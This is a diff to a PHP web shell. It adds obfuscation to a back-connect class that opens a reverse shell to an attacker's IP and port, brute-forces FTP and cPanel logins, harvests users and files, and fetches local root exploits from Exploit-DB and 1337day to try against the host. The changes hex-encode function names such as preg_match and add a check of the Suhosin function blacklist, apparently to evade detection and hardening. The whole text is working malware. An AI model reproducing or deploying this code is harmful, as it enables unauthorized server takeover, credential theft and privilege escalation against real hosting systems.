+        $suhosin = @ini_get("suhosin.ex\x65cutor.func.bl\x61cklist");
+        if (empty($suhosin) == false) {
+            $suhosin = explode(',', $suhosin);
+            $suhosin = array_map('trim', $suhosin);
+            $suhosin = array_map('strtolower', $suhosin);
+            return (function_exists($func) == true && array_search($func, $suhosin) === false);
+        }
+    }
+    return function_exists($func);
+}
 	function setcharset($charset) {
+	$sf = "suhosin_fun\x63_exi\x73ts";
 		if ($charset && $this->charsetdb[$charset]) {
-			if(function_exists('mysql_set_charset')) {
+			if($sf('mysql_set_charset')) {
 				mysql_set_charset($this->charsetdb[$charset], $this->link);
 			} else {
 				$this->query("SET character_set_connection='".$this->charsetdb[$charset]."', character_set_results='".$this->charsetdb[$charset]."', character_set_client=binary");
@@ -3858,8 +3887,8 @@ class DB_MySQL  {
 	}
 	function halt($msg =''){
 		echo "<h2>".htmlspecialchars($msg)."</h2>\n";
-		echo "<p class=\"b\">Mysql error description: ".htmlspecialchars($this->geterrdesc())."</p>\n";
-		echo "<p class=\"b\">Mysql error number: ".$this->geterrno()."</p>\n";
+		echo "<p class=\"b\">MySQL Error Description: ".htmlspecialchars($this->geterrdesc())."</p>\n";
+		echo "<p class=\"b\">MySQL error number: ".$this->geterrno()."</p>\n";
 		exit;
 	}
 	function get_fields_meta($result) {
@@ -3961,6 +3990,7 @@ class BC
   }
   private function createshell()
   {
+  	$prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
   $socket = @fsockopen($this->your_ip,$this->your_port,$errno,$errstr,$this->timeout) or die("<font color='red'>Unfortunately could not spawn shell</font>\n<br>");
   print("<font color='green'>Shell process opened to <strong>$this->server_ip</strong> > <strong>$this->your_ip:$this->your_port</strong></font>\n<br>");
   ob_flush(); flush();
@@ -3996,22 +4026,22 @@ class BC
   print "<font color='green'>Command whoami;</font>\n";
   print $result;
   ob_flush(); flush();
-  preg_match("#([0-9]).([0-9]).([0-9]+)-([a-z0-9]+)#si",@shell_exec("uname -r"),$version);
+  $prgm("#([0-9]).([0-9]).([0-9]+)-([a-z0-9]+)#si",@shell_exec("uname -r"),$version);
   $version1 = $version[0];
   $version2 = $version[1].".".$version[2].".".$version[3];
   print "<pre>";
   while(1)
   {
   $enter = fgets($socket);
-  if(preg_match('#exit#',$enter)){fwrite($socket,"Process closed\n");exit("Process closed");fclose($socket);}
-  if(preg_match('#exploit#',$enter)){$this->search($version1,$socket);$this->search($version2,$socket);}
-  if(preg_match('#grabusr#',$enter)){$this->grab_users($socket);}
-  if(preg_match('#catln (.+)#',$enter,$file)){$this->catln($file[1],$socket);}
-  if(preg_match('#index (.+)#',$enter,$file)){$this->index($file[1],$socket);}
-  if(preg_match('#getf (.+)#',$enter,$file)){$this->getf($file[1],$socket);}
-  if(preg_match('#ftp (.+)#',$enter,$file)){$this->ftp($file[1],$socket);}
-  if(preg_match('#cpanel (.+)#',$enter,$file)){$this->cpanel($file[1],$socket);}
-  if(preg_match('#domains#',$enter)){$this->domains($socket);}
+  if($prgm('#exit#',$enter)){fwrite($socket,"Process closed\n");exit("Process closed");fclose($socket);}
+  if($prgm('#exploit#',$enter)){$this->search($version1,$socket);$this->search($version2,$socket);}
+  if($prgm('#grabusr#',$enter)){$this->grab_users($socket);}
+  if($prgm('#catln (.+)#',$enter,$file)){$this->catln($file[1],$socket);}
+  if($prgm('#index (.+)#',$enter,$file)){$this->index($file[1],$socket);}
+  if($prgm('#getf (.+)#',$enter,$file)){$this->getf($file[1],$socket);}
+  if($prgm('#ftp (.+)#',$enter,$file)){$this->ftp($file[1],$socket);}
+  if($prgm('#cpanel (.+)#',$enter,$file)){$this->cpanel($file[1],$socket);}
+  if($prgm('#domains#',$enter)){$this->domains($socket);}
   if(eregi('home',$enter)){chdir($this->homefolder);}
   if(strpos($enter,'cd ..')){
   $curr = getcwd();
@@ -4023,9 +4053,9 @@ class BC
   $path   = "/".$path;
   if(!chdir($path)){fwrite($socket,"Can't chdir into $path : Permission denied\n");}
   }
-  elseif(preg_match('#cd (.+)#',$enter,$dir)){
+  elseif($prgm('#cd (.+)#',$enter,$dir)){
   $curr = getcwd();
-  if(preg_match("#\/#si",$dir[1]))
+  if($prgm("#\/#si",$dir[1]))
   {
   if(!chdir($dir[1])){fwrite($socket,"Can't chdir into $dir[1] : Permission denied\n");}
   }
@@ -4046,13 +4076,15 @@ class BC
   }
   private function search($version,$socket)
   {
+		$prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
+		$prgma = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68\x5f\x61\x6c\x6c";
     fwrite($socket,"Release: $version\n");
     print("Release: $version\n<br>");
     ob_flush();flush();
     fwrite($socket,"Searching Exploit-DB for local root exploits..\n");
     print("Searching Exploit-DB for local root exploits..\n<br>");
     $exploit_db = $this->curl("http://www.exploit-db.com/search/?action=search&filter_description=$version");
-    if(preg_match('/No results/si',$exploit_db))
+    if($prgm('/No results/si',$exploit_db))
     {
     fwrite($socket,"Not found any exploits\n");
     print("Not found any exploits\n<br>");
@@ -4063,10 +4095,10 @@ class BC
     fwrite($socket,"==================== Possible Exploits =====================\n");
     print("==================== Possible Exploits =====================\n<br>");
     ob_flush();flush();
-    preg_match_all('#<td class="list_explot_description">(.*?)<\/td>#si',$exploit_db,$list);
+    $prgma('#<td class="list_explot_description">(.*?)<\/td>#si',$exploit_db,$list);
     foreach($list[1] as $listx)
     {
-    preg_match('#<a  href="(.*?)">(.*?)<\/a>#si',$listx,$exploit);
+    $prgm('#<a  href="(.*?)">(.*?)<\/a>#si',$listx,$exploit);
     fwrite($socket,"[+] ".$exploit[2]."\n");
     print("[+] ".$exploit[2]."\n<br>");
     fwrite($socket,"Trying pwn this server with this exploit\n");
@@ -4120,7 +4152,7 @@ class BC
     print("Searching 1337day for local root exploits..\n<br>");
     ob_flush();flush();
     $day1337 = $this->curl("http://www.1337day.com/search","agree=Ok&dong=$version&submit_search=Submit");
-    preg_match_all("#<a href='/exploit/description/(.*?)'  >(.*?)<\/a>#si",$day1337,$exploits);
+    $prgma("#<a href='/exploit/description/(.*?)'  >(.*?)<\/a>#si",$day1337,$exploits);
     if($exploits[1])
     {
     fwrite($socket,"==================== Possible Exploits =====================\n");
@@ -4188,13 +4220,14 @@ class BC
   {
   curl_setopt($ch,CURLOPT_POSTFIELDS,$post);
   }
-  $exec = curl_exec($ch);
+  $cex = curl_exec($ch);
   curl_close($ch);
-  return $exec;
+  return $cex;
   }
   private function download($url)
   {
-  preg_match('#\/exploits\/(.+)#si',$url,$filename);
+  	$prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
+  $prgm('#\/exploits\/(.+)#si',$url,$filename);
   $filename = $filename[1].".c";
   $url    = str_replace("exploits","download",$url);
   $openurl  = @file_get_contents($url);
@@ -4209,10 +4242,11 @@ class BC
   }
   private function day1337download($url)
   {
-  preg_match('#\/exploit\/(.+)#si',$url,$filename);
+  	$prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
+  $prgm('#\/exploit\/(.+)#si',$url,$filename);
   $filename = $filename[1].".c";
   $data    = $this->curl($url,"agree=Ok");
-  preg_match("#<pre class='brush: plain; tab-size: 8'>(.*?)<\/pre>#si",$data,$content);
+  $prgm("#<pre class='brush: plain; tab-size: 8'>(.*?)<\/pre>#si",$data,$content);
   if(file_put_contents($filename,$content))
   {
   return $filename;
@@ -4375,6 +4409,7 @@ class BC
   }
   private function ftp($wordlist,$socket)
   {
+  	$prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
   fwrite($socket,"Starting ftp crack..\n");
   ob_flush();flush();
   $open = file($wordlist);
@@ -4416,7 +4451,7 @@ class BC
     foreach($curl as $cid => $cend)
     {
     $data[$cid] = curl_multi_getcontent($cend);
-    if(preg_match('#drw#si',$data[$cid]))
+    if($prgm('#drw#si',$data[$cid]))
     {
     fwrite($socket,"Found username: $u[$cid] , password: $pwd\n");
     print("<font color='red'>Found username: $u[$cid] , password: $pwd</font>\n");
@@ -4749,6 +4784,18 @@ function str_replace_first($search, $replace, $subject) {
         $subject = substr_replace($subject, $replace, $pos, strlen($search));
     }
     return $subject;
+}
+function suhosin_func_exists($func) {
+    if (extension_loaded('suhosin')) {
+        $suhosin = @ini_get("suhosin.ex\x65cutor.func.bl\x61cklist");
+        if (empty($suhosin) == false) {
+            $suhosin = explode(',', $suhosin);
+            $suhosin = array_map('trim', $suhosin);
+            $suhosin = array_map('strtolower', $suhosin);
+            return (function_exists($func) == true && array_search($func, $suhosin) === false);
+        }
+    }
+    return function_exists($func);
 }
 function pr($s)
 {
